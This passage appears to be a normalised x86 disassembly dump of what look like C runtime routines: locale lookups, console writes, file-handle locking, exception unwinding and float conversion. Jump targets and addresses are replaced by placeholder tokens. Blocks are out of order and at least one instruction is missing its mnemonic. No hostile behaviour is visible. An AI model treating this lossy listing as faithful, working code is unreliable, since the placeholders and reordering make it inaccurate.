or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx cx
mov si bx
jmp r-xdata
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx dx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx cx [ edi ]
movzx ecx cx
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx cx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx cx
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_43638c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_424b04
add esp 0xc
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx ax [ eax ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx ax
movzx eax cl
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al bl
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp cx bx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx ax al
or cx ax
inc [ ebp + 0x8 ]
movzx ecx cx
xor ecx ecx
jmp r-xdata
movzx eax ax
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
movzx dx dl
shl eax 0x8
or ax dx
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_436510
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436530
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_4234de
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_436575
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_436575
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_436530
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_436625
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_436644
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_43661c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_436625
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_436647
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_4366c8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_43674e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_425ec4
and [ eax ] 0x0
call sub_425eb1
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_425ec4
mov [ eax ] esi
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_423d36
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_4367c5
push 0xc
push r--data
call sub_42b398
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_42b3dd
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43685c
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_435756
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_436865
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_43688c
push 0x18
push r--data
call sub_42b398
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_42e1f5
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_436a1d
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_42b3dd
retn
push 0x40
push 0x20
call sub_42894a
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_4367c5
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_42e2b8
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_43695f
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_435756
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_436a26
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_42a4a3
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_42a4ac
pop ecx
test eax eax
je r-xdata
push eax
call sub_42a4ac
pop ecx
test eax eax
je r-xdata
push eax
call sub_42a4ac
push [ rw-data ]
mov esi eax
call sub_42a4ac
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_42a431
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_42a431
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_42a431
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_42a431
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_42a431
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_42a4ac
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_436b8f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_425eb1
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_436bda
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_436c0e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
mov ebx [ GetLocaleInfoW@IAT ]
push esi
push edi
xor edi edi
xor esi esi
inc edi
cmp eax esi
jne r-xdata
cmp eax 0x2
je r-xdata
push esi
push esi
push edi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoA@IAT ]
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
cmp eax edi
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
cmp [ ebp + 0x1c ] esi
jne r-xdata
xor eax eax
jmp r-xdata
push esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4234de
leave
retn
jle r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push edi
call sub_428160
pop ecx
mov eax esi
jmp r-xdata
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_425484
pop ecx
cmp eax esi
je r-xdata
call sub_433a10
mov edi esp
cmp edi esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push 0xffffffff
push edi
push esi
push [ ebp + 0x1c ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp edi esi
je r-xdata
sub_436d4d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_436c0e
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_436d8a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_438779
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4234de
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_436e4f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_434645
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_425eb1
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_436f80
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_436fab
push 0x10
push r--data
call sub_42b398
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_425eb1
mov [ eax ] 0x9
call sub_425eb1
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_423d36
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_42b3dd
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_4367c5
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_425eb1
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_43674e
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_437082
mov eax [ ebp - 0x1c ]
call sub_425ec4
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_43708c
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
